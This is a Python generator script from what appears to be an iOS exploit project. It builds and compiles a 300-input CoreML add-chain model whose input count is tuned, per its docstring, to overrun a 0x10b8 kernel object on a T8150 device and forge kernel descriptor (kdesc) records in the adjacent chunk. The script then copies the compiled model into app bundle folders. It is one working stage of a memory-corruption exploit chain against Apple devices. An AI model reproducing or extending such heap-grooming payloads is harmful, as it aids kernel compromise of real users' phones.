#!/usr/bin/env python3
"""Emit XVRC27_300in_1out_addchain — 300 in -> 1 out, T8150 (iOS 27.0 24A435).

WHY 300 (P073 v13b, follow-up to the 257-in artifact): the door needs the
record stream to run MANY records past the 0x10b8 object into the next
chunk to forge a full kdesc array (xnu-13432 kdescs are 16B = 1:1 with
records). First out-of-object record (1-based #259, index 258) straddles
obj+0x10b0..0x10c0; #260.. fully outside.
  300-in + 1-out = 301 total records = 258 in-through-object (the 255-record
  array + the 3-record trailer band) + 43 records past the 0x10b8 boundary
  (indices 258..300: 1 straddler + 42 fully outside) = the desc-block
  forging stream on the 17 Pro Max.
The fill's in-count = the compiled program's input count — nothing derived
caps it at 257. 257-in stays committed as the first-round variant (P073 v13b
selects 300-in when present in the bundle, falls back to 257-in).

Same shape as the addchain family (make_257in_addchain.py template): all
inputs consumed by an add chain so CoreML cannot DCE them, Double [1]
MultiArrays, output name "y" (P073 reads featureValueForName:@"y").
Inputs x_000..x_299; y = sum(x) (y = 45150 if inputs are 1..300 = 300x301/2).

Do not bundle an UNcompiled .mlmodel into the app targets (coremlc breaks
the IPA) — this script ships the precompiled .mlmodelc only. Run with no
argument to emit to model/ (+ copies into Resources/ane/ and
P007OpenOnly/P007OpenOnly/); CI passes an out-dir to compile into a bundle:
  python3 tools/make_300in_addchain.py <out-dir>
  python3 tools/make_300in_addchain.py all
"""
from __future__ import annotations

import shutil
import subprocess
import sys
from pathlib import Path

N = 300
NAME = "XVRC27_300in_1out_addchain"
ROOT = Path(__file__).resolve().parents[1]
CARG = sys.argv[1].strip().lower() if len(sys.argv) > 1 else "all"
TMP_MLMODEL = Path(f"/tmp/{NAME}.mlmodel")
TMP_COMPILE = Path("/tmp/xvrc27_300in_mlc")


def build_spec():
    from coremltools.models.datatypes import Array
    from coremltools.models.neural_network import NeuralNetworkBuilder
    from coremltools.proto import FeatureTypes_pb2 as ft

    inputs = [(f"x_{i:03d}", Array(1)) for i in range(N)]
    builder = NeuralNetworkBuilder(
        input_features=inputs,
        output_features=[("y", Array(1))],
        disable_rank5_shape_mapping=True,
    )
    # addchain: acc_00N = 1.0*x_000, then chained ADD, then 1.0*scale -> "y"
    # (identical op shape to the 254/257 addchain family the lab already
    # evaluated: the fill's record count is the FEATURE count, not bytes).
    builder.add_elementwise(
        name="acc_000",
        input_names=["x_000"],
        output_name="acc_000",
        mode="MULTIPLY",
        alpha=1.0,
    )
    for i in range(1, N):
        builder.add_elementwise(
            name=f"acc_{i:03d}",
            input_names=[f"acc_{i-1:03d}", f"x_{i:03d}"],
            output_name=f"acc_{i:03d}",
            mode="ADD",
        )
    builder.add_elementwise(
        name="out_scale",
        input_names=[f"acc_{N-1:03d}"],
        output_name="y",
        mode="MULTIPLY",
        alpha=1.0,
    )
    spec = builder.spec
    for t in spec.description.input:
        t.type.multiArrayType.dataType = ft.ArrayFeatureType.DOUBLE
    spec.description.output[0].type.multiArrayType.dataType = ft.ArrayFeatureType.DOUBLE
    spec.description.metadata.shortDescription = (
        f"XVRC-27 {N}-in 1-out addchain: y = sum(x). T8150 0x10b8 record area"
        " (255 in-bounds) — 300-in + 1-out = 301 records = 43 records past the"
        " 0x10b8 boundary (desc-block forging stream)."
    )
    spec.description.metadata.author = "XVRC-27 local generator"
    spec.specificationVersion = max(spec.specificationVersion, 4)
    return spec


def find_coremlc() -> Path | None:
    for root in (
        Path("/Users/kolby/Downloads/Xcode.app/Contents/Developer"),
        Path("/Applications/Xcode.app/Contents/Developer"),
    ):
        cand = root / "usr" / "bin" / "coremlc"
        if cand.is_file():
            return cand
    w = shutil.which("coremlc")
    return Path(w) if w else None


def compile_spec() -> Path:
    spec = build_spec()
    names_in = [t.name for t in spec.description.input]
    assert names_in == [f"x_{i:03d}" for i in range(N)], names_in[:2] + names_in[-2:]
    assert [t.name for t in spec.description.output] == ["y"]
    TMP_MLMODEL.write_bytes(spec.SerializeToString())
    print("wrote", TMP_MLMODEL, "bytes", TMP_MLMODEL.stat().st_size)

    coremlc = find_coremlc()
    if not coremlc:
        print("[-] coremlc not found (Xcode toolchain required to compile)", file=sys.stderr)
        raise SystemExit(2)
    if TMP_COMPILE.exists():
        shutil.rmtree(TMP_COMPILE)
    TMP_COMPILE.mkdir(parents=True)
    env = {"DEVELOPER_DIR": str(coremlc.parents[2])}
    r = subprocess.run(
        [str(coremlc), "compile", str(TMP_MLMODEL), str(TMP_COMPILE)],
        env=env, capture_output=True, text=True,
    )
    sys.stdout.write(r.stdout)
    sys.stderr.write(r.stderr)
    if r.returncode != 0:
        raise SystemExit(r.returncode)
    compiled = TMP_COMPILE / f"{NAME}.mlmodelc"
    if not compiled.is_dir():
        found = list(TMP_COMPILE.glob("*.mlmodelc"))
        if not found:
            print("[-] coremlc produced no mlmodelc under", TMP_COMPILE, file=sys.stderr)
            raise SystemExit(3)
        compiled = found[0]
    return compiled


def ship(compiled: Path, out_dir: Path) -> Path:
    out_mlc = out_dir / f"{NAME}.mlmodelc"
    out_dir.mkdir(parents=True, exist_ok=True)
    if out_mlc.exists():
        shutil.rmtree(out_mlc)
    shutil.copytree(compiled, out_mlc)
    print("[+] shipped", out_mlc)
    return out_mlc


def main() -> int:
    compiled = compile_spec()
    if CARG == "all":
        ship(compiled, ROOT / "model")
        ship(compiled, ROOT / "Resources" / "ane")
        ship(compiled, ROOT / "P007OpenOnly" / "P007OpenOnly")
    else:
        ship(compiled, Path(CARG).resolve())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())